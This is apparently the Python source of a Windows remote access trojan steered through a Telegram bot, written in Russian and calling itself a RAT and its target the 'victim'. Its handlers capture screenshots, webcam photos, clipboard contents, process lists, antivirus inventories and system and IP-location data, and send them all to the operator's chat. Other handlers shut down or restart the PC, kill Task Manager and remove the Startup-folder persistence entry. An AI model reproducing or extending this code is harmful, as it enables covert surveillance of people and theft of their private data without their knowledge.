# ---- Imports ---- #
import os, re
from PIL import ImageGrab
from aiogram import types
import win32api
import platform
import psutil
import GPUtil
import time
import requests
import pyautogui as p
import cv2
import pyperclip
from win32com.client import GetObject
import sys
import ctypes
import subprocess
# ---- Imports ---- #

def Screen(dp, bot, admin_id):
    @dp.message_handler(text_contains='Скриншот')
    async def screen(message: types.Message):
        if message.from_user.id == admin_id:
            await bot.send_message(admin_id, 'Понял тебя, сейчас будет скриншот 🖼️')
            screen = ImageGrab.grab()
            screen.save(os.getcwd() + '\\sreenshot.jpg')
            f = open(os.getcwd() + '\\sreenshot.jpg',"rb")
            await bot.send_document(admin_id, f)
            try:
                os.remove(os.getcwd() + '\\sreenshot.jpg')
            except Exception as e:
                await bot.send_message(admin_id, e)



def Antiviruses(dp, bot, admin_id):
    @dp.message_handler(text_contains='Антивирусы')
    async def antiviruses(message: types.Message):
        if message.from_user.id == admin_id:
            await bot.send_message(admin_id, 'Понял тебя. Cейчас скину cписок антивирусов ПК 🤖')
            Antiviruses = {
                'C:\\Program Files\\Windows Defender': 'Windows Defender',
                'C:\\Program Files\\AVAST Software\\Avast': 'Avast',
                'C:\\Program Files\\AVG\\Antivirus': 'AVG',
                'C:\\Program Files (x86)\\Avira\\Launcher': 'Avira',
                'C:\\Program Files (x86)\\IObit\\Advanced sysCare': 'Advanced sysCare',
                'C:\\Program Files\\Bitdefender Antivirus Free': 'Bitdefender',
                'C:\\Program Files\\DrWeb': 'Dr.Web',
                'C:\\Program Files\\ESET\\ESET Security': 'ESET',
                'C:\\Program Files (x86)\\Kaspersky Lab': 'Kaspersky Lab',
                'C:\\Program Files (x86)\\360\\Total Security': '360 Total Security',
                'C:\\Program Files\\ESET\\ESET NOD32 Antivirus': 'ESET NOD32'
            }
            Antivirus = [Antiviruses[d] for d in filter(os.path.exists, Antiviruses)]
            AntivirusesAll = '\n'.join(Antivirus)
            await bot.send_message(admin_id, "<code>"+ AntivirusesAll + "</code>", parse_mode='HTML')



def Pc_info(dp, bot, admin_id):
    @dp.message_handler(text_contains='Данные ПК')
    async def pc_info(message: types.Message):
        if message.from_user.id == admin_id:
            await bot.send_message(admin_id, 'Щас достанем все характеристики компуктера 🖥️')
            try:
                def get_size(bytes, suffix="B"):
                    factor = 1024
                    for unit in ["", "K", "M", "G", "T", "P"]:
                        if bytes < factor:
                            return f"{bytes:.2f}{unit}{suffix}"
                        bytes /= factor
                uname = platform.uname()

                namepc = "\nИмя пк: " + str(uname.node)
                countofcpu = psutil.cpu_count(logical=True)
                allcpucount = "\nОбщее количество ядер процессора:" + str(countofcpu) 

                cpufreq = psutil.cpu_freq()
                cpufreqincy = "\nЧастота процессора: " + str(cpufreq.max) + 'Mhz'


                svmem = psutil.virtual_memory()
                allram = "\nОбщая память ОЗУ: " + str(get_size(svmem.total))
                ramfree = "\nДоступно: " + str(get_size(svmem.available))
                ramuseg = "\nИспользуется: " + str(get_size(svmem.used))

                partitions = psutil.disk_partitions()
                for partition in partitions:
                    nameofdevice = "\nДиск: " + str(partition.device)
                    nameofdick = "\nИмя диска: " + str(partition.mountpoint)
                    typeoffilesystem = "\nТип файловой системы: " + str(partition.fstype)
                    try:
                        partition_usage = psutil.disk_usage(partition.mountpoint)
                    except PermissionError:

                        continue
                    allstorage = "\nОбщая память: " + str(get_size(partition_usage.total))
                    usedstorage = "\nИспользуется: " + str(get_size(partition_usage.used))
                    freestorage = "\nСвободно: " + str(get_size(partition_usage.free))



                try:
                    gpus = GPUtil.getGPUs()
                    list_gpus = []
                    for gpu in gpus:

                        gpu_name = "\nМодель видеокарты: " + gpu.name

                        gpu_free_memory = "\nСвободно памяти в видеокарте: " + f"{gpu.memoryFree}MB"

                        gpu_total_memory = "\nОбщая память видеокарты: " f"{gpu.memoryTotal}MB"

                        gpu_temperature = "\nТемпература видеокарты в данный момент: " f"{gpu.temperature} °C"
                except:
                    await bot.send_message(admin_id, '\nВидеокарты нету либо она встроенная')

                headers = {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
                }
                drives = str(win32api.GetLogicalDriveStrings())
                drives = str(drives.split('\000')[:-1])

                try:
                    ip = requests.get('https://api.ipify.org').text
                    urlloc = 'http://ip-api.com/json/'+ip
                    location1 = requests.get(urlloc, headers=headers).text
                except Exception as e:
                    location1 = "Неизвестно"
                    print(e)
                all_data = "Время: " + time.asctime() + '\n' + '\n' + "Процессор: " + platform.processor() + '\n' + "Система: " + platform.system() + ' ' + platform.release() + '\nДанные локации и IP:' + location1 + '\nДиски:' + drives + str(namepc) + str(allcpucount) + str(cpufreq) + str(cpufreqincy) + str(svmem) + str(allram) + str(ramfree) + str(ramuseg) + str(nameofdevice) + str(nameofdick) + str(typeoffilesystem )+ str(allstorage) + str(usedstorage) + str(freestorage)
                await bot.send_message(admin_id, "<i>" + all_data + "</i>", parse_mode='HTML')
            except Exception as e:
                await bot.send_message(admin_id, e)



def VolumeON(dp, bot, admin_id):
    @dp.message_handler(text_contains='Включить звук на 100%')
    async def volumeON(message: types.Message):
        try:
            msg = await bot.send_message(admin_id, 'Уно моменто, щас будет звук на макс 🔊')
            for x in range(1,100):
                p.hotkey('volumeup')
            await bot.edit_message_text('Звук успешно был включен на 100% ✅', admin_id, msg.message_id)
        except Exception as e:
            await bot.send_message(admin_id, e)



def VolumeOFF(dp, bot, admin_id):
    @dp.message_handler(text_contains='Выключить звук')
    async def volumeOFF(message: types.Message):
        try:
            msg = await bot.send_message(admin_id, 'Уно моменто, щас выключем звук 🔈')
            p.hotkey('volumemute')
            await bot.edit_message_text('Звук успешно был вылючен ✅', admin_id, msg.message_id)
        except Exception as e:
            await bot.send_message(admin_id, e)



def Shutdown(dp, bot, admin_id):
    @dp.message_handler(text_contains='Выключить ПК')
    async def shutdown(message: types.Message):
        try:
            await bot.send_message(admin_id, 'Выключаю пк...💤')
            os.system('shutdown /s /t 0')
        except Exception as e:
            await bot.send_message(admin_id, e)



def Restart(dp, bot, admin_id):
    @dp.message_handler(text_contains='Перезагрузить ПК')
    async def restart(message: types.Message):
        try:
            await bot.send_message(admin_id, 'Перезагружаю пк...🔃')
            os.system('shutdown /r /t 0')
        except Exception as e:
            await bot.send_message(admin_id, e)



def F4(dp, bot, admin_id):
    @dp.message_handler(text_contains='ALT + F4')
    async def f4(message: types.Message):
        try:
            msg = await bot.send_message(admin_id, 'Щас закроем окно 🌚')
            p.hotkey('alt','f4')
            await bot.edit_message_text('Окно было успешно закрыто ✅', admin_id, msg.message_id)
        except Exception as e:
            await bot.send_message(admin_id, e)



def WinD(dp, bot, admin_id):
    @dp.message_handler(text_contains='Свернуть все окна')
    async def wind(message: types.Message):
        try:
            msg = await bot.send_message(admin_id, 'Щас свернём окно 🌚')
            p.hotkey('win','d')
            await bot.edit_message_text('Окно было успешно свёрнуто ✅', admin_id, msg.message_id)
        except Exception as e:
            await bot.send_message(admin_id, e)



def GetDir(dp, bot, admin_id):
    @dp.message_handler(text_contains='Директория')
    async def getdir(message: types.Message):
        try:
            msg = await bot.send_message(admin_id, 'Уно моменто, щас получим директорию в которой находимся...')
            dr = os.getcwd()
            await bot.edit_message_text("Текущая директрия, в которой находиться RAT: " + "\n<code>" + dr + "</code>", admin_id, msg.message_id, parse_mode='HTML')
        except Exception as e:
            await bot.send_message(admin_id, e)


def ListDir(dp, bot, admin_id):
    @dp.message_handler(text_contains='Содержание директории')
    async def listdir(message: types.Message):
        try:
            msg = await bot.send_message(admin_id, 'Уно моменто, щас получим содержание директории в которой находимся...')
            ls = os.listdir()
            info = '<code>' + '\n'.join([str(elem) for elem in ls]) + "</code>"

            if len(info) > 4096:
                for x in range(0, len(info), 4096):
                    await bot.send_message(admin_id, info[x:x+4096], parse_mode='HTML')
            else:
                await bot.send_message(admin_id, info, parse_mode='HTML')
        except Exception as e:
            await bot.send_message(admin_id, e)



def Selfie(dp, bot, admin_id):
    @dp.message_handler(text_contains='Фото с вебкамеры')
    async def selfie(message: types.Message):
        try:
            msg = await bot.send_message(admin_id, 'Скажите сссыр, делаем селфи🤳')
            cap = cv2.VideoCapture(0)
            dr = os.getcwd()
            for i in range(30):
                cap.read()
            ret, frame = cap.read()
            cv2.imwrite(dr + '\\4543t353454.png', frame)   
            cap.release()
            webcam = open(dr + '\\4543t353454.png','rb')
            await bot.send_document(admin_id, webcam)
            os.remove(dr + '\\4543t353454.png')
        except Exception as e:
            await bot.send_message(admin_id, e)


def Screamer(dp, bot, admin_id):
    @dp.message_handler(text_contains='Скример')
    async def screamer(message: types.Message):
        msg = await bot.send_message(admin_id, 'Сейчас будет страшно...🙇🏻‍♂️')
        try:
            base_path = sys._MEIPASS
        except Exception:
            base_path = os.path.abspath(".")
        file = os.path.join(base_path, 'videoplayback.mp4')
        os.system(file)
        time.sleep(10)
        await bot.edit_message_text("Он обкончался, я сам видел 🫠", admin_id, msg.message_id)



def SeeEx(dp, bot, admin_id):
    @dp.message_handler(text_contains='Посмотреть буфер обмена')
    async def seex(message: types.Message):
        if message.from_user.id == admin_id:
            msg = await bot.send_message(admin_id, 'Уно моменто...')
            Buffer = pyperclip.paste()
            await bot.edit_message_text(f'Буфер обмена:\n<code>{Buffer}</code>', admin_id, msg.message_id, parse_mode='HTML')

def ProcList(dp, bot, admin_id):
    @dp.message_handler(text_contains='Список процессов')
    async def proclist(message: types.Message):
        if message.from_user.id == admin_id:
            msg = await bot.send_message(admin_id, 'Уно моменто...')
            result = [process.Properties_('Name').Value for process in GetObject('winmgmts:').InstancesOf('Win32_Process')]
            await bot.edit_message_text(f'Весь список процессов:\n<code>{result}</code>', admin_id, msg.message_id, parse_mode='HTML')



def CloseTask(dp, bot, admin_id):
    @dp.message_handler(text_contains='Закрыть диспетчер задач')
    async def closetask(message: types.Message):
        if message.from_user.id == admin_id:
            a = os.system(f'taskkill /im Taskmgr.exe')
            if a == 128:
                await bot.send_message(admin_id, 'Такой процесс не запущен')
            elif a == 0:
                await bot.send_message(admin_id, 'Процесс успешно был закрыт')
            elif a == 1:
                await bot.send_message(admin_id, 'Жертва не запустила программу от имени администратора')



def Uninstall(dp, bot, admin_id):
    @dp.message_handler(text_contains='Самоуничтожение')
    async def uninstall(message: types.Message):
        if message.from_user.id == admin_id:
            await bot.send_message(admin_id, 'Пока 😢, я перестану свою работу, после перезагрузки.\nЛайфхак: ты сам можешь перезагрузить пк :)')
            Thisfile = sys.argv[0]
            os.system(f'ping 127.0.0.1 -n 3 > nul && del /f "{os.path.expanduser("~")}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{os.path.basename(Thisfile)}"')



def DVDOpen(dp, bot, admin_id):
    @dp.message_handler(text_contains='Открыть DVD')
    async def dvdopen(message: types.Message):
        if message.from_user.id == admin_id:
            try:
                ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door open', None, 0, None)
                await bot.send_message(admin_id, 'Успешно ✅')
            except:
                await bot.send_message(admin_id, 'У жертвы нету DVD')


def DVDClose(dp, bot, admin_id):
    @dp.message_handler(text_contains='Закрыть DVD')
    async def dvdclose(message: types.Message):
        if message.from_user.id == admin_id:
            try:
                ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door closed', None, 0, None)
                await bot.send_message(admin_id, 'Успешно ✅')
            except:
                await bot.send_message(admin_id, 'У жертвы нету DVD')

